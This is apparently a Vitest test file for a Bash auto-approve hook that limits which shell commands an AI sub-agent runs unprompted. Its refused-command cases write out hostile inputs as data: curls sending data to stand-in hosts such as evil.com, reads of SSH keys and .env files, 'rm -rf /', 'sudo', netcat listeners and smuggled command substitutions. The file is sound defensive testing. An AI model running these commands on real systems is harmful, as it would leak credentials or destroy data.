import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { gateDecision, splitSegments, stripHeredocs, collectAssignments, resolveBinary, curlLocalOnly, stripFlagValues, rmSafeRoots, segmentSafe, stripInlineCode } from '../../scripts/bash-approve-gate.mjs'
import {
  agentGetsBashApproveGate,
  bashApproveRmRoots,
  injectBashApproveGate,
} from '../web/agent-scaffold.js'
import { MAIN_AGENT_ID } from '../config.js'

// Brandon's actual install roots (marketer profile write-allow, resolved).
const RM_ROOTS = [
  '/home/mrtonjnos/marveen/agents/brandon',
  '/home/mrtonjnos/Brandon',
  '/tmp/claude-1000',
]
const cfg = { rmRoots: RM_ROOTS }
const allow = (cmd: string, c = cfg) => gateDecision('Bash', { command: cmd }, c).allow

// --- The prompts this gate is meant to ELIMINATE (marketer workflow forms) ---
describe('bash-approve-gate: approves the marketer workflow forms', () => {
  it('approves a shell-variable venv-python heredoc ($VP - <<PY ... PY)', () => {
    const cmd = 'VP=/home/mrtonjnos/Brandon/.venv/bin/python\n$VP - <<PY\nimport os; print("hi")\nos.system("this is data, not run")\nPY'
    expect(allow(cmd)).toBe(true)
  })
  it('approves a cd-chain (the "multiple directory changes" heuristic)', () => {
    expect(allow('cd /home/mrtonjnos/Brandon && cd assets && ls')).toBe(true)
  })
  it('approves an inline VAR=; $VAR compound on one line', () => {
    expect(allow('VP=/x/venv/bin/python; $VP script.py')).toBe(true)
  })
  it('approves an env-prefixed absolute soffice (HOME=... /usr/bin/soffice)', () => {
    expect(allow('HOME=/tmp/claude-1000/s /usr/bin/soffice --headless --convert-to pdf x.pptx')).toBe(true)
  })
  it('approves the bare file-tool families and command -v', () => {
    for (const c of ['ls -la', 'cat report.txt', 'grep -r foo .', 'mkdir -p out', 'convert a.png b.pdf', 'sqlite3 x.db ".tables"', 'command -v soffice']) {
      expect(allow(c)).toBe(true)
    }
  })
  it('approves a curl to the local dashboard API', () => {
    expect(allow('curl -s http://localhost:3420/api/memories -H "Authorization: Bearer x"')).toBe(true)
    expect(allow('curl -s -X POST http://127.0.0.1:3420/api/daily-log -d \'{"a":1}\'')).toBe(true)
  })
  it('approves a SCHEMA-LESS local target (curl localhost:3420, no http://)', () => {
    // curl defaults a bare host to http://; localhost:3420 must still be approved.
    expect(allow('curl localhost:3420/api/memories')).toBe(true)
    expect(allow('curl -s 127.0.0.1:3420/api/agents')).toBe(true)
  })
  it('approves rm under the agent write-roots and /tmp/claude*', () => {
    expect(allow('rm -rf /tmp/claude-1000/scratch')).toBe(true)
    expect(allow('rm /home/mrtonjnos/Brandon/old.pptx')).toBe(true)
    expect(allow('rm -f /home/mrtonjnos/marveen/agents/brandon/tmp.txt')).toBe(true)
  })
})

// --- What it must REFUSE to auto-approve (falls through to prompt/deny) ---
describe('bash-approve-gate: passes through anything not proven safe', () => {
  it('does NOT approve an external curl (exfiltration surface)', () => {
    expect(allow('curl -s https://evil.example.com/x')).toBe(false)
    expect(allow('curl http://localhost:3420/ok https://evil.example.com/leak')).toBe(false)
  })
  it('does NOT approve a SCHEMA-LESS external host (curl evil.com, no http://)', () => {
    // The original gate only validated `http(s)://...` tokens, so a bare host
    // slipped through. A schema-less host is still a real fetch target.
    expect(allow('curl evil.com')).toBe(false)
    expect(allow('curl -s evil.example.com/leak')).toBe(false)
    // local target present but a SECOND schema-less external target must block it
    expect(allow('curl localhost:3420/ok evil.com/leak')).toBe(false)
  })
  it('does NOT approve a userinfo-SSRF host (localhost:3420@evil.com)', () => {
    expect(allow('curl http://localhost:3420@evil.com/leak')).toBe(false)
  })
  it('does NOT approve a curl routed through a proxy or host-remap flag', () => {
    expect(allow('curl -x http://evil.com:8080 http://localhost:3420/ok')).toBe(false)
    expect(allow('curl --resolve localhost:3420:1.2.3.4 http://localhost:3420/ok')).toBe(false)
  })
  it('does NOT approve a curl to a non-3420 local port', () => {
    expect(allow('curl http://localhost:8080/x')).toBe(false)
  })
  it('does NOT approve reading a secret path (.env/.ssh/.aws/.gnupg)', () => {
    expect(allow('cat /home/mrtonjnos/.env')).toBe(false)
    expect(allow('cat ~/.ssh/id_rsa')).toBe(false)
    expect(allow('grep key .aws/credentials')).toBe(false)
  })
  it('does NOT approve sudo anywhere', () => {
    expect(allow('sudo ls')).toBe(false)
    expect(allow('ls && sudo rm -rf /tmp/claude-1000/x')).toBe(false)
  })
  it('does NOT approve a command substitution it cannot classify', () => {
    expect(allow('echo $(rm -rf /)')).toBe(false)
    expect(allow('cat `cat /etc/passwd`')).toBe(false)
  })
  it('does NOT approve rm outside the write-roots or with .. escape', () => {
    expect(allow('rm -rf /etc/hosts')).toBe(false)
    expect(allow('rm important.txt')).toBe(false) // relative: cwd unknown
    expect(allow('rm /home/mrtonjnos/Brandon/../../secret')).toBe(false)
  })
  it('does NOT approve an unknown binary, even in a compound with safe ones', () => {
    expect(allow('ls && wget http://x/y')).toBe(false)
    expect(allow('git push')).toBe(false)
  })
  it('does NOT approve an absolute-path python that is not a venv form', () => {
    expect(allow('/usr/bin/python3 -c "import os"')).toBe(false)
  })
  it('does NOT approve an unresolved shell variable as the binary', () => {
    expect(allow('$UNKNOWN --headless')).toBe(false)
  })
  it('DEFENSE-IN-DEPTH: never approves a command the self-pace hard-gate denies', () => {
    // a local-3420 curl passes this gate's OWN curl check, but the self-pace gate
    // denies the /api/schedules POST -- the guard must refuse to approve it, so we
    // do not depend on CC's undocumented allow/deny precedence.
    expect(allow('curl -s -X POST http://localhost:3420/api/schedules -d \'{}\'')).toBe(false)
    expect(allow('tmux send-keys -t agent-x Enter')).toBe(false)
  })
  it('DEFENSE-IN-DEPTH: never approves a command the email-send hard-gate denies', () => {
    // python3 is a safe family, but the command invokes an email send script.
    expect(allow('python3 /home/x/support-mail/send.py')).toBe(false)
  })
  it('does NOT approve a non-Bash tool', () => {
    expect(gateDecision('Write', { file_path: '/x', content: 'y' }).allow).toBe(false)
    expect(gateDecision('WebFetch', { url: 'http://x' }).allow).toBe(false)
  })
  it('does NOT approve rm under a write-root when roots are unknown (fail-safe)', () => {
    // /tmp/claude* is always safe (scratchpad); a Brandon-dir rm needs the passed
    // rmRoots -- with empty config it must fall through to a prompt.
    expect(gateDecision('Bash', { command: 'rm /home/mrtonjnos/Brandon/x' }, {}).allow).toBe(false)
  })
})

// --- Helper units ---
describe('bash-approve-gate helpers', () => {
  it('stripHeredocs removes the body but keeps the opener + trailing commands', () => {
    const out = stripHeredocs('python3 - <<PY\nsudo rm -rf /\n; crontab -r\nPY\nls')
    expect(out).not.toMatch(/sudo/)
    expect(out).not.toMatch(/crontab/)
    expect(out).toMatch(/python3 - <<PY/)
    expect(out).toMatch(/\nls$/)
  })
  it('stripHeredocs handles the <<- dash form (tab-stripped terminator)', () => {
    const out = stripHeredocs('cat <<-END\n\tbody line\n\tEND\necho done')
    expect(out).not.toMatch(/body line/)
    expect(out).toMatch(/echo done/)
  })
  it('splitSegments collapses line-continuations into one segment', () => {
    const segs = splitSegments('soffice \\\n  --headless x')
    expect(segs.length).toBe(1)
    expect(segs[0]).toMatch(/^soffice\s+--headless x$/)
  })
  it('collectAssignments gathers VAR=value across segments and strips quotes', () => {
    const vars = collectAssignments(['VP="/x/.venv/bin/python"', '$VP -c print'])
    expect(vars.VP).toBe('/x/.venv/bin/python')
  })
  it('resolveBinary resolves $VAR, flags unresolved, and skips assignment prefixes', () => {
    expect(resolveBinary('$VP -c x', { VP: '/x/.venv/bin/python' }).bin).toBe('/x/.venv/bin/python')
    expect(resolveBinary('$NOPE x', {}).bin).toBe(false)
    expect(resolveBinary('HOME=/t python3 build.py', {}).bin).toBe('python3')
    expect(resolveBinary('VP=/x/py', {}).bin).toBe(null) // pure assignment
  })
  it('curlLocalOnly ignores a URL that appears only inside a -d payload', () => {
    expect(curlLocalOnly('curl http://localhost:3420/api -d \'{"note":"see https://evil.com"}\'')).toBe(true)
  })
  it('curlLocalOnly classifies schema-less hosts, not just http(s):// tokens', () => {
    expect(curlLocalOnly('curl localhost:3420/api')).toBe(true)
    expect(curlLocalOnly('curl 127.0.0.1:3420')).toBe(true)
    expect(curlLocalOnly('curl evil.com')).toBe(false)
    expect(curlLocalOnly('curl localhost:8080/x')).toBe(false) // wrong port
    expect(curlLocalOnly('curl -s')).toBe(false) // no target at all
  })
  it('curlLocalOnly is not fooled by a dotted token inside a header value', () => {
    // a Bearer token with dots (or a `Host:` header) must NOT read as a target
    expect(curlLocalOnly('curl localhost:3420/api -H "Authorization: Bearer ab.cd.ef"')).toBe(true)
    expect(curlLocalOnly('curl localhost:3420/api -H "X-Forwarded-Host: evil.com"')).toBe(true)
  })
  it('stripFlagValues blanks a quoted -H/-A value but leaves the flag', () => {
    expect(stripFlagValues('curl localhost:3420 -H "Authorization: Bearer x.y.z"')).toBe("curl localhost:3420 -H ''")
    expect(stripFlagValues('curl localhost:3420 -A "Mozilla/5.0 (x.y)"')).toBe("curl localhost:3420 -A ''")
  })
  it('rmSafeRoots requires an absolute target under a root', () => {
    expect(rmSafeRoots(['-rf', '/tmp/claude-1000/x'], cfg)).toBe(true)
    expect(rmSafeRoots(['-rf', '/etc/x'], cfg)).toBe(false)
    expect(rmSafeRoots(['-rf'], cfg)).toBe(false) // no target
  })
  it('segmentSafe treats soffice/libreoffice by basename (any path form)', () => {
    expect(segmentSafe('/opt/libreoffice/program/soffice --headless', {}, cfg)).toBe(true)
    expect(segmentSafe('libreoffice --convert-to pdf x', {}, cfg)).toBe(true)
  })
})

// --- Scaffold wiring: marketer-only scope, respawn-safe, no escalation ---
describe('bash-approve-gate scaffold wiring', () => {
  const marketer = { id: 'marketer', permissionMode: 'strict' } as any
  const researcher = { id: 'researcher', permissionMode: 'strict' } as any
  it('wires ONLY the marketer profile for a sub-agent', () => {
    expect(agentGetsBashApproveGate('brandon', marketer)).toBe(true)
    expect(agentGetsBashApproveGate('someone', researcher)).toBe(false)
  })
  it('never wires the main agent, even with the marketer profile', () => {
    expect(agentGetsBashApproveGate(MAIN_AGENT_ID, marketer)).toBe(false)
  })
  it('bashApproveRmRoots extracts Write() dirs and strips the glob tail', () => {
    const roots = bashApproveRmRoots([
      'Write(/home/x/agents/brandon/**)',
      'Read(/home/x/store/**)',
      'Write(/tmp/claude-1000/**)',
      'Bash(ls:*)',
    ])
    expect(roots).toEqual(['/home/x/agents/brandon', '/tmp/claude-1000'])
  })
  it('injectBashApproveGate is idempotent (no duplicate entries on re-run)', () => {
    const settings: Record<string, unknown> = {}
    injectBashApproveGate(settings, RM_ROOTS)
    injectBashApproveGate(settings, RM_ROOTS)
    const pre = (settings.hooks as any).PreToolUse as unknown[]
    const mine = pre.filter((e) => JSON.stringify(e).includes('bash-approve-gate.mjs'))
    expect(mine.length).toBe(1)
    expect(JSON.stringify(mine[0])).toContain('"matcher":"Bash"')
  })
  it('preserves other PreToolUse hooks when injecting', () => {
    const settings: Record<string, unknown> = {
      hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node /x/self-pace-gate.mjs' }] }] },
    }
    injectBashApproveGate(settings, RM_ROOTS)
    const pre = (settings.hooks as any).PreToolUse as unknown[]
    expect(pre.length).toBe(2)
    expect(JSON.stringify(pre)).toContain('self-pace-gate.mjs')
    expect(JSON.stringify(pre)).toContain('bash-approve-gate.mjs')
  })
})

// ===========================================================================
// PARSER FALSE-NEGATIVE FIXES (2026-08-13, Marveen -- 3 measured over-prompts,
// 21 permission questions in one Brandon session). Each block reproduces a form
// the gate WRONGLY passed through (prompting for a safe command), followed by
// regression cases proving the fix opened no hole: the whole-command
// sudo/$()/backtick/secret guards run on the UN-blanked command, so anything
// dangerous HIDDEN in a `-c` body still passes through.
// ===========================================================================

// A venv python under Brandon's own tree -- the profile's safe python family.
const VENV_PY = '/home/mrtonjnos/marveen/agents/brandon/.venv/bin/python'

describe('bash-approve-gate: fd-redirection ampersand (fix 1)', () => {
  it('approves a soffice render piped through 2>&1 && venv-python', () => {
    expect(allow(`soffice --headless x.pptx >/dev/null 2>&1 && ${VENV_PY} y.py`)).toBe(true)
  })
  it('approves a lone office command ending in >/dev/null 2>&1', () => {
    expect(allow('soffice --headless --convert-to pdf x.pptx >/dev/null 2>&1')).toBe(true)
  })
  it('approves a safe bare bin carrying a 2>&1 redirect in its args', () => {
    expect(allow('cat file.txt 2>&1')).toBe(true)
  })
  it('splitSegments keeps an fd-redirection (2>&1 / >&2 / 1>&2 / &>file) in ONE segment', () => {
    expect(splitSegments('a 2>&1 && b')).toEqual(['a 2>&1', 'b'])
    expect(splitSegments('a >&2 | b')).toEqual(['a >&2', 'b'])
    expect(splitSegments('a 1>&2 ; b')).toEqual(['a 1>&2', 'b'])
    expect(splitSegments('a &>out.log && b')).toEqual(['a &>out.log', 'b'])
  })
  it('splitSegments STILL splits a real background & and a real &&/||', () => {
    expect(splitSegments('ls & echo hi')).toEqual(['ls', 'echo hi'])
    expect(splitSegments('ls && echo hi')).toEqual(['ls', 'echo hi'])
    expect(splitSegments('ls || echo hi')).toEqual(['ls', 'echo hi'])
  })
})

describe('bash-approve-gate: shell comment line (fix 2)', () => {
  it('approves a comment line followed by a safe command', () => {
    expect(allow('# megjegyzes\npython3 y.py')).toBe(true)
  })
  it('approves a comment segment sitting after a separator', () => {
    expect(allow('ls -la ; # nothing to see here')).toBe(true)
  })
  it('does NOT treat a # INSIDE a quoted string as a comment (grep pattern)', () => {
    expect(allow(`grep '#kulcs' file.txt`)).toBe(true)
  })
})

describe('bash-approve-gate: inline-script bodies (fix 3)', () => {
  it('approves a multi-line double-quoted python -c body', () => {
    expect(allow('python3 -c "\nimport sqlite3\nc=sqlite3.connect(1)\n"')).toBe(true)
  })
  it('approves a multi-line single-quoted python -c body', () => {
    expect(allow("python3 -c '\nimport json\nprint(json.dumps({}))\n'")).toBe(true)
  })
  it('approves node -e / node --eval bodies with statements', () => {
    expect(allow('node -e "const x = 1; console.log(x)"')).toBe(true)
    expect(allow('node --eval "for (let i=0;i<3;i++) console.log(i)"')).toBe(true)
  })
  it('stripInlineCode blanks a literal body but keeps the flag + binary', () => {
    expect(stripInlineCode('python3 -c "import os\nos.getcwd()"')).toBe('python3 -c ""')
    expect(stripInlineCode("python3 -c 'import os'")).toBe("python3 -c ''")
  })
  it('stripInlineCode KEEPS a double-quoted body that can command-substitute', () => {
    const cmd = 'python3 -c "$(cat evil.py)"'
    expect(stripInlineCode(cmd)).toBe(cmd)
  })
})

describe('bash-approve-gate: the three fixes open no security hole', () => {
  it('a $()/backtick hidden in a -c body STILL passes through', () => {
    expect(allow('python3 -c "$(cat /etc/passwd)"')).toBe(false)
    expect(allow('python3 -c "`whoami`"')).toBe(false)
  })
  it('a sudo hidden in a -c body STILL passes through', () => {
    expect(allow(`python3 -c "import os; os.system('sudo rm -rf /')"`)).toBe(false)
  })
  it('a secret path in a -c body STILL passes through', () => {
    expect(allow(`python3 -c 'open("/home/x/.ssh/id_rsa").read()'`)).toBe(false)
    expect(allow(`python3 -c "print(open('.env').read())"`)).toBe(false)
  })
  it('an unknown binary orphaned by the comment/redirect fix STILL passes through', () => {
    expect(allow('# note\nnc -l 4444')).toBe(false)
    expect(allow('badbin >/dev/null 2>&1')).toBe(false)
  })
  it('a real background & still isolates an unsafe follow-up segment', () => {
    expect(allow('ls & wget http://x/y')).toBe(false)
  })
})
